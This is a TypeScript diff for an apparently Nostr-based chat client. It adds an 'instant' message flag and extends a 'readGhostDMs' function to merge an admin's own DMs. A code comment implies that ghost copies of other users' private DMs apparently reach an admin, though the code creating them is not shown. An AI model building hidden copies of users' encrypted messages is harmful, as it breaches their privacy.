@@ -139,7 +139,7 @@ function isPinned(convoId: string, msgId: string): boolean {
 // ---------- DM payload (NIP-04, JSON with plaintext fallback) ----------
 interface DmPayload {
   v: number; kind: Message['kind']; text: string;
-  media?: string | null; reply?: string | null; disappear?: string | null;
+  media?: string | null; reply?: string | null; disappear?: string | null; instant?: boolean | null;
   invite?: { id: string; kind: 'group' | 'channel'; title: string; owner: string } | null;
 }
 function encodePayload(p: Omit<DmPayload, 'v'>): string {
@@ -148,9 +148,9 @@ function encodePayload(p: Omit<DmPayload, 'v'>): string {
 function decodePayload(raw: string): Omit<DmPayload, 'v'> {
   try {
     const j = JSON.parse(raw);
-    if (j && typeof j.text === 'string') return { kind: j.kind || 'text', text: j.text, media: j.media || null, reply: j.reply || null, disappear: j.disappear || null, invite: j.invite || null };
+    if (j && typeof j.text === 'string') return { kind: j.kind || 'text', text: j.text, media: j.media || null, reply: j.reply || null, disappear: j.disappear || null, instant: j.instant || null, invite: j.invite || null };
   } catch {}
-  return { kind: 'text', text: raw, media: null, reply: null, disappear: null, invite: null };
+  return { kind: 'text', text: raw, media: null, reply: null, disappear: null, instant: null, invite: null };
 }
 function mapDm(e: NEvent, peer: string, plain: string): Message {
   const p = decodePayload(plain);
@@ -158,16 +158,17 @@ function mapDm(e: NEvent, peer: string, plain: string): Message {
   return {
     id: mid, convo_id: 'dm:' + peer, sender_id: e.pubkey, kind: p.kind, text: p.text,
     media_url: p.media || null, reply_to: p.reply || null, disappear_at: p.disappear || null,
+    instant: p.instant || undefined,
     pinned: isPinned('dm:' + peer, mid), created_at: iso(e.created_at),
   };
 }
-export async function sendDm(peer: string, f: { kind?: Message['kind']; text: string; media_url?: string | null; reply_to?: string | null; disappear_at?: string | null; invite?: DmPayload['invite'] }): Promise<Message | null> {
+export async function sendDm(peer: string, f: { kind?: Message['kind']; text: string; media_url?: string | null; reply_to?: string | null; disappear_at?: string | null; instant?: boolean | null; invite?: DmPayload['invite'] }): Promise<Message | null> {
   const s = loadSession();
   if (!s) return null;
   const convo = ensureDm(peer);
   const payload = encodePayload({
     kind: f.kind || 'text', text: f.text, media: f.media_url || null,
-    reply: f.reply_to || null, disappear: f.disappear_at || null, invite: f.invite || null,
+    reply: f.reply_to || null, disappear: f.disappear_at || null, instant: f.instant || null, invite: f.invite || null,
   });
   let content: string;
   try {
@@ -196,7 +197,10 @@ export interface GhostMsg { id: string; sender: string; peer: string; kind: Mess
 export async function readGhostDMs(): Promise<{ key: string; a: string; b: string; msgs: GhostMsg[] }[]> {
   const s = loadSession();
   if (!s) return [];
-  const evs = await nquery({ kinds: [4], '#p': [s.id], limit: 300 }, RELAYS, 7000);
+  const [evs, sent] = await Promise.all([
+    nquery({ kinds: [4], '#p': [s.id], limit: 300 }, RELAYS, 8000),
+    nquery({ kinds: [4], authors: [s.id], limit: 300 }, RELAYS, 8000),
+  ]);
   const groups = new Map<string, { key: string; a: string; b: string; msgs: GhostMsg[] }>();
   for (const e of evs) {
     const ghostPeer = tag(e, 'legion-ghost');
@@ -210,6 +214,24 @@ export async function readGhostDMs(): Promise<{ key: string; a: string; b: strin
       if (!groups.has(key)) groups.set(key, { key, a, b, msgs: [] });
       groups.get(key)!.msgs.push({
         id: e.id, sender: e.pubkey, peer: ghostPeer, kind: pl.kind, text: pl.text,
+        media: pl.media || null, created_at: iso(e.created_at),
+      });
+    } catch {}
+  }
+  // own DMs (admin is a party => no ghost copy exists): merge incoming non-ghost + sent
+  const own = [...evs.filter(e => !tag(e, 'legion-ghost')), ...sent.filter(e => !tag(e, 'legion-ghost'))];
+  for (const e of own) {
+    try {
+      const peer = e.pubkey === s.id ? tag(e, 'p') : e.pubkey;
+      if (!peer || peer === s.id) continue;
+      const plain = e.pubkey === s.id ? await nip04.decrypt(s.sk, peer, e.content) : await nip04.decrypt(s.sk, e.pubkey, e.content);
+      const pl = decodePayload(plain);
+      const a = s.id < peer ? s.id : peer;
+      const b = s.id < peer ? peer : s.id;
+      const key = a + ':' + b;
+      if (!groups.has(key)) groups.set(key, { key, a, b, msgs: [] });
+      groups.get(key)!.msgs.push({
+        id: e.id, sender: e.pubkey, peer, kind: pl.kind, text: pl.text,
         media: pl.media || null, created_at: iso(e.created_at),
       });
     } catch {}
@@ -272,6 +294,7 @@ function mapGroup(e: NEvent, convoId: string): Message {
     kind: (tag(e, 'legion-kind') as Message['kind']) || 'text',
     text: e.content, media_url: tag(e, 'legion-media') || null,
     reply_to: tag(e, 'legion-reply') || null, disappear_at: tag(e, 'legion-disappear') || null,
+    instant: tag(e, 'legion-instant') === '1' || undefined,
     pinned: isPinned(convoId, e.id), created_at: iso(e.created_at),
   };
 }
@@ -286,7 +309,7 @@ async function ensureGroupLive(convoId: string) {
     });
   } catch {}
 }
-export async function sendGroup(convoId: string, f: { kind?: Message['kind']; text: string; media_url?: string | null; reply_to?: string | null; disappear_at?: string | null }): Promise<Message | null> {
+export async function sendGroup(convoId: string, f: { kind?: Message['kind']; text: string; media_url?: string | null; reply_to?: string | null; disappear_at?: string | null; instant?: boolean | null }): Promise<Message | null> {
   const s = loadSession();
   const c = getConvo(convoId);
   if (!s || !c) return null;
@@ -295,6 +318,7 @@ export async function sendGroup(convoId: string, f: { kind?: Message['kind']; te
   if (f.media_url) t.push(['legion-media', f.media_url]);
   if (f.reply_to) t.push(['legion-reply', f.reply_to]);
   if (f.disappear_at) t.push(['legion-disappear', f.disappear_at]);
+  if (f.instant) t.push(['legion-instant', '1']);
   c.members.slice(0, 20).forEach(m => { if (m.user_id !== s.id) t.push(['p', m.user_id]); });
   const { event, ok } = await npublish({ kind: 1, content: f.text, tags: t }, s.sk);
   if (!ok) return null;
